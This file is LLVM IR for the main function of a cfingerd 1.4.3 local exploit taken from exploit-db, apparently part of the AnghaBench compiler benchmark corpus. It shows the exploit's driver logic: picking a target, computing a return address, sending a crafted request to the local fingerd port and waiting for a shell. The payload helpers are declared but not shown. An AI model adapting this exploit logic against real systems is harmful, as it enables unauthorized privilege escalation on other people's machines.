; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_20964.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_20964.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i8*, i32 }
%struct.passwd = type { i8* }

@.str = private unnamed_addr constant [49 x i8] c"\0A  cfingerd 1.4.3 and prior exploit by qitest1\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [6 x i8] c"t:o:h\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = common dso_local global i32 0, align 4
@sel = common dso_local global i64 0, align 8
@offset = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [25 x i8] c"+User: %s\0A  against: %s\0A\00", align 1
@target = common dso_local global %struct.TYPE_2__* null, align 8
@.str.3 = private unnamed_addr constant [30 x i8] c"+Using: retaddr = %p...\0A  ok\0A\00", align 1
@LOCALHOST = common dso_local global i32 0, align 4
@FINGERD_PORT = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.5 = private unnamed_addr constant [35 x i8] c"+Waiting for a shell...\0A  0x69 =)\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [256 x i8], align 16
  %10 = alloca %struct.passwd*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str, i64 0, i64 0))
  br label %12

12:                                               ; preds = %32, %2
  %13 = load i32, i32* %4, align 4
  %14 = load i8**, i8*** %5, align 8
  %15 = call i32 @getopt(i32 %13, i8** %14, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0))
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* @EOF, align 4
  %17 = icmp ne i32 %15, %16
  br i1 %17, label %18, label %33

18:                                               ; preds = %12
  %19 = load i32, i32* %7, align 4
  switch i32 %19, label %32 [
    i32 116, label %20
    i32 111, label %24
    i32 104, label %27
  ]

20:                                               ; preds = %18
  %21 = load i32, i32* @optarg, align 4
  %22 = call i8* @atoi(i32 %21)
  %23 = ptrtoint i8* %22 to i64
  store i64 %23, i64* @sel, align 8
  br label %32

24:                                               ; preds = %18
  %25 = load i32, i32* @optarg, align 4
  %26 = call i8* @atoi(i32 %25)
  store i8* %26, i8** @offset, align 8
  br label %32

27:                                               ; preds = %18
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 0
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @usage(i8* %30)
  br label %32

32:                                               ; preds = %18, %27, %24, %20
  br label %12

33:                                               ; preds = %12
  %34 = call i32 (...) @geteuid()
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %8, align 4
  %36 = call i64 @getpwuid(i32 %35)
  %37 = inttoptr i64 %36 to %struct.passwd*
  store %struct.passwd* %37, %struct.passwd** %10, align 8
  %38 = load %struct.passwd*, %struct.passwd** %10, align 8
  %39 = getelementptr inbounds %struct.passwd, %struct.passwd* %38, i32 0, i32 0
  %40 = load i8*, i8** %39, align 8
  %41 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %42 = load i64, i64* @sel, align 8
  %43 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %41, i64 %42
  %44 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %43, i32 0, i32 0
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.2, i64 0, i64 0), i8* %40, i8* %45)
  %47 = load i8*, i8** @offset, align 8
  %48 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %49 = load i64, i64* @sel, align 8
  %50 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %48, i64 %49
  %51 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %50, i32 0, i32 1
  %52 = load i32, i32* %51, align 8
  %53 = sext i32 %52 to i64
  %54 = getelementptr i8, i8* %47, i64 %53
  %55 = ptrtoint i8* %54 to i32
  store i32 %55, i32* %51, align 8
  %56 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %57 = load i64, i64* @sel, align 8
  %58 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %56, i64 %57
  %59 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %58, i32 0, i32 1
  %60 = load i32, i32* %59, align 8
  %61 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.3, i64 0, i64 0), i32 %60)
  %62 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %63 = load i64, i64* @sel, align 8
  %64 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %62, i64 %63
  %65 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %64, i32 0, i32 1
  %66 = load i32, i32* %65, align 8
  %67 = load %struct.passwd*, %struct.passwd** %10, align 8
  %68 = call i32 @play_the_game(i32 %66, %struct.passwd* %67)
  %69 = load i32, i32* @LOCALHOST, align 4
  %70 = load i32, i32* @FINGERD_PORT, align 4
  %71 = call i32 @sockami(i32 %69, i32 %70)
  store i32 %71, i32* %6, align 4
  %72 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %73 = load %struct.passwd*, %struct.passwd** %10, align 8
  %74 = getelementptr inbounds %struct.passwd, %struct.passwd* %73, i32 0, i32 0
  %75 = load i8*, i8** %74, align 8
  %76 = call i32 @sprintf(i8* %72, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i64 0, i64 0), i8* %75)
  %77 = load i32, i32* %6, align 4
  %78 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %79 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %80 = call i32 @strlen(i8* %79)
  %81 = call i32 @send(i32 %77, i8* %78, i32 %80, i32 0)
  %82 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.5, i64 0, i64 0))
  %83 = call i32 @sleep(i32 1)
  %84 = load i32, i32* %6, align 4
  %85 = call i32 @shellami(i32 %84)
  %86 = load i32, i32* %3, align 4
  ret i32 %86
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i8* @atoi(i32) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @geteuid(...) #1

declare dso_local i64 @getpwuid(i32) #1

declare dso_local i32 @play_the_game(i32, %struct.passwd*) #1

declare dso_local i32 @sockami(i32, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @shellami(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
